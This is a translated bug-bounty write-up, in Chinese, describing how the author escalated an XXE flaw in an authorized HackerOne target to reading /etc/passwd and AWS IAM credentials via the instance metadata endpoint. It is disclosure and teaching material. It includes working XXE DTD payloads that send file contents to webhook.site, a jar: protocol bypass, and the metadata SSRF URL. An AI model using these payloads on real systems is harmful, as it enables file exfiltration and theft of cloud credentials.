# 从XXE到AWS元数据泄露

##### 译文声明
本文是翻译文章，原文作者为AlMadjus，来源网站为almadj.us。译文仅供参考，具体内容及含义以原文为准。

最近，我在HackerOne的一个私人漏洞赏金计划中发现了一个关键漏洞，该漏洞使我能够获取其亚马逊网络服务（AWS）的根密钥。因此，该漏洞被评为危急等级10.0，这是最高级别。

我使用自定义字典通过[ffuf](https://github.com/ffuf/ffuf)工具对几个子域名进行了扫描，并检查了结果。其中一个子域名最初仅显示一个空白页面，但当我访问`//foo`路径时，出现了一个有趣的页面；请注意此处使用了两个斜杠。在不到十分钟的时间内，我发现了一个跨站脚本（XSS）漏洞，尽管最终确认这是一个重复报告。

几天后，我再次对该子域名进行了更深入的研究。在GitHub上，我找到了与该子域名相关的测试凭证和登录负载的仓库，并决定对其进行测试。若非GitHub上的信息泄露，我可能永远不会知道存在这个登录功能，因为它的路径非常隐蔽且未被我的爆破词库收录。

使用测试凭证成功登录后，我获得了上传文件的权限。鉴于POST请求的数据格式为XML，我决定进一步测试XML外部实体（XXE）文档类型定义（DTD）注入的可能性。

唯一可以插入DTD的地方是在密码字段中，而用户名则由URL路径指定。我构造了一个简单的POST请求：
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://webhook.site/foo"> ]> 
...
&xxe;
```
发送此数据后，我的`webhook.site`接收到了服务请求，这表明DTD已启用。接着，我尝试读取Web服务器上的某个文件，但未能成功。

下一步，我尝试检索外部DTD。将`http://webhook.site/foo`替换为虚拟的自托管DTD后，观察到Web应用程序确实获取了该文件。

此时，我已经具备了所有必要条件，可以尝试读取Web应用服务器上的文件并将其内容发送到我的服务器。我发送了如下有效载荷：
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://webhook.site/pwn.dtd">%xxe; ]> 
...
&send;
```
其中`pwn.dtd`的内容为：
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://webhook.site/?data=%file;'>">
<!ENTITY % file SYSTEM "file:///etc/passwd">
%all;
```

然而，这种方法并未如预期般奏效。虽然Web应用程序确实加载了我的DTD，但我从未收到后续的`?data`请求，而是收到了应用程序返回的错误消息。原因在于`/etc/passwd`文件中的特殊字符破坏了GET请求。

在检查本地Linux系统中是否存在单行且无特殊字符的文件时，我选择了`/etc/hostname`作为目标。尽管这一发现令我不甚满意，但我仍希望能读取系统中的任意文件。于是，我尝试通过FTP协议在应用程序响应中进行外链操作，但均未成功。因此，我向HackerOne提交了一份关于影响重大的XXE DTD本地文件包含（LFI）漏洞报告。

次日，我继续探索此漏洞。对于当前的影响范围感到不满，我希望找到一种方法来读取任意文件。负责审核我的报告的HackerOne工作人员建议我尝试读取另一个单行文件，但他们对此并无异议。

随后，我与Dee-see（一位出色的黑客）交流，他向我推荐了一种使用`jar:`协议提取文件的方法：
> 我曾翻译过一篇Black Hat会议的主题演讲，其中提到这种技术。
根据上述链接，我对DTD文件内容进行了调整，再次尝试导出`/etc/passwd`：
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'jar:http://webhook.site/?data=%file;'>">
<!ENTITY % file SYSTEM "file:///etc/passwd">
%all;
```
这次真的成功了！

虽然不是通过出站LFI的方式，但我能够在服务器响应中完整地读取`/etc/passwd`！我向HackerOne报告了这一进展，他们将我的报告归类为高危漏洞。有关`jar:`协议的更多信息，请参阅[这里](https://gosecure.github.io/xxe-workshop/#7)。实际上，它用于读取`.zip`或`.jar`文件中的内容，但在这种情况下，它帮助我绕过了限制，从而能够读取任何文件。

不过，我对当前的结果仍不满意，一直在思考如何将问题升级至更严重的程度。我试图扫描服务器的开放端口，希望获得SSH密钥并登录，但只有80和443端口处于开放状态。之后，我询问HackerOne是否允许我在服务器上执行更深层次的测试，他们表示同意。

通过仅在文件实体中提供`file:///`路径，我能够读取目录内容，但却无法读取`/proc/self/environ`，后者可能存储了AWS的元数据；一些特殊字符同样导致了失败。于是，我想到了将LFI转换为服务器端请求伪造（SSRF），查询典型的AWS元数据端点`http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM_USER_ROLE`。

当然，我不知道`IAM_USER_ROLE`的具体值，但通过访问`http://169.254.169.254/latest/meta-data/iam/security-credentials/`，Web应用程序友好地在错误信息中向我透露了相关信息！

最后，我在HackerOne平台上提交了这份报告，他们将严重程度调整为10.0。最终，我获得了2000美元的奖金。

此次经历教会了我什么？永远不要满足于表面的发现，应持续深入挖掘，直到穷尽所有提高漏洞严重性的可能性。当然，在不确定的情况下，务必征求许可。我并不喜欢在未经明确授权的情况下对公司的生产环境进行渗透测试，但对方十分理解并允许我继续操作，前提是不更改或访问敏感数据。